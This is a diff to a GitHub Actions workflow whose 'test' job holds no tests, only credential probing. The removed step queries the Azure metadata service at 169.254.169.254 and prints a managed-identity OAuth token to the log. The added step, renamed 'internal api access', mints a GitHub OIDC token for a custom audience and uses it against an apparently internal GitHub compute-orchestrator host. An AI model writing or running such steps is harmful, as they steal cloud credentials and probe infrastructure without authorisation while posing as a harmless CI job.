@@ -7,13 +7,18 @@ jobs:
   test:
     runs-on: ubuntu-latest
     steps:
-      - name: azure metadata
+      - name: internal api access
         run: |
-          echo "=== AZURE IMDS ==="
-          curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
-          echo ""
-          echo "=== AZURE TOKEN ==="
-          curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
-          echo ""
-          echo "=== AZURE IDENTITY ==="
-          curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/info?api-version=2018-02-01"
+          # OIDC token with ro_audience
+          OIDC=$(curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://hosted-compute-ro")
+          TOKEN=$(echo $OIDC | python3 -m json.tool | grep '"value"' | cut -d'"' -f4)
+          echo "TOKEN_LENGTH: ${#TOKEN}"
+          
+          # Internal API access karo
+          curl -s "https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com/vm/v1" \
+            -H "Authorization: Bearer $TOKEN" | head -20
+          
+          # VM details
+          curl -s "https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com/vm/v1/info" \
+            -H "Authorization: Bearer $TOKEN" | head -20
